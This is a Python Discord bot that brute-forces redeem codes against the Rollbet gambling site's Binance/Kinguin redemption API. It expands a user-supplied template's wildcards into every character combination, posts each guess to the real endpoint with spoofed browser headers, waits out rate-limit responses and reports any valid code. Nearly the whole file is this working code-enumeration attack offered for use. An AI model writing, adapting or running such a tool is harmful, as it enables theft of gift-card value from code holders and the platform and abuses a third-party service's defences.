import discord
from discord.ext import commands
import aiohttp
import asyncio
import json
from itertools import product
import datetime
import zoneinfo
import os
import time

# Load tokens
with open("auth.json", "r") as f:
    auth = json.load(f)
ROLLBET_TOKEN = auth["rollbet_token"]  # no "Bearer "
DISCORD_TOKEN = auth["discord_token"]

# Load config with delay fallback
if os.path.exists("config.json"):
    with open("config.json", "r") as f:
        config = json.load(f)
    BRUTE_CHARS = config.get("brute_chars", "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    delay = config.get("starting_delay", 0.300)
else:
    BRUTE_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    delay = 0.300

# Set up Discord
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)

# EST Timezone
EST = zoneinfo.ZoneInfo("America/New_York")

# Log attempts
async def log_attempt(code, status, text):
    timestamp = datetime.datetime.now(tz=EST).strftime("%Y-%m-%d %H:%M:%S %Z")
    log_line = f"{code} | Status: {status} | Response: {text} | Time: {timestamp}\n"
    await asyncio.to_thread(lambda: open("attempts_log.txt", "a", encoding="utf-8").write(log_line))

# Log exceptions
async def log_exception(code, exception):
    timestamp = datetime.datetime.now(tz=EST).strftime("%Y-%m-%d %H:%M:%S %Z")
    log_line = f"{code} | Exception: {str(exception)} | Time: {timestamp}\n"
    await asyncio.to_thread(lambda: open("attempts_log.txt", "a", encoding="utf-8").write(log_line))

# Try to redeem a code
async def try_redeem(session, code, headers):
    url = "https://api.rollbet.gg/trading/binance/redeem"
    payload = {
        "provider": "kinguin",
        "code": code,
        "pin": None
    }
    try:
        async with session.post(url, json=payload, headers=headers) as resp:
            status = resp.status
            text = await resp.text()
            await log_attempt(code, status, text)
            return status, text
    except Exception as e:
        await log_exception(code, e)
        return None, str(e)

@bot.event
async def on_ready():
    print(f"✅ Bot is ready. Logged in as {bot.user}")

@bot.command()
async def manual(ctx, *, code_template):
    await ctx.send(f"📨 Code template received: `{code_template}`")

    wildcard_positions = [i for i, c in enumerate(code_template) if c == '*']
    if not wildcard_positions:
        await ctx.send("❌ No asterisks `*` found in the template.")
        return

    headers = {
        "Authorization": ROLLBET_TOKEN,  # no 'Bearer ' prefix
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Origin": "https://rollbet.gg",
        "Referer": "https://rollbet.gg/",
    }

    async with aiohttp.ClientSession() as session:
        test_status, _ = await try_redeem(session, "FAKECODE1234", headers)
        if test_status not in (400, 404):
            await ctx.send(f"🔴 API check failed (status: {test_status})")
            return

        await ctx.send("🟢 API is responsive. Starting brute-force...")

        total_attempts = len(BRUTE_CHARS) ** len(wildcard_positions)
        attempt_count, retries = 0, 0
        found = False
        start_time = time.time()

        last_msg = await ctx.send(f"🔄 Progress: 0/{total_attempts} | Delay: {delay:.2f}s")

        for combo in product(BRUTE_CHARS, repeat=len(wildcard_positions)):
            code_list = list(code_template)
            for pos, char in zip(wildcard_positions, combo):
                code_list[pos] = char
            code_try = "".join(code_list)

            print(f"🔍 Attempt {attempt_count + 1}/{total_attempts}: {code_try}")

            while True:
                status, response = await try_redeem(session, code_try, headers)

                if status == 204:
                    await ctx.send(f"✅ Valid code: `{code_try}`")
                    found = True
                    break

                elif status == 400:
                    print(f"❌ 400 error for `{code_try}`, continuing...")
                    break

                elif status == 429:
                    await ctx.send(f"⚠️ 429 Rate Limited. Waiting {delay} second before retry...")
                    await asyncio.sleep(delay)
                    continue

                elif status == 404:
                    break

                else:
                    await ctx.send(f"❗ Unknown response {status} for `{code_try}`. Stopping.")
                    return

            attempt_count += 1
            if found:
                break

            if attempt_count % 10 == 0:
                elapsed = time.time() - start_time
                avg_time = elapsed / attempt_count
                remaining = (total_attempts - attempt_count) * avg_time
                eta = datetime.timedelta(seconds=int(remaining))
                await last_msg.edit(content=f"🔄 {attempt_count}/{total_attempts} | Delay: {delay:.2f}s | ETA: {eta}")

            await asyncio.sleep(delay)

        if not found:
            await ctx.send("❌ No valid code found.")
            await ctx.send(f"⏱️ Final delay: {delay:.2f}s | Retries: {retries}")

bot.run(DISCORD_TOKEN)
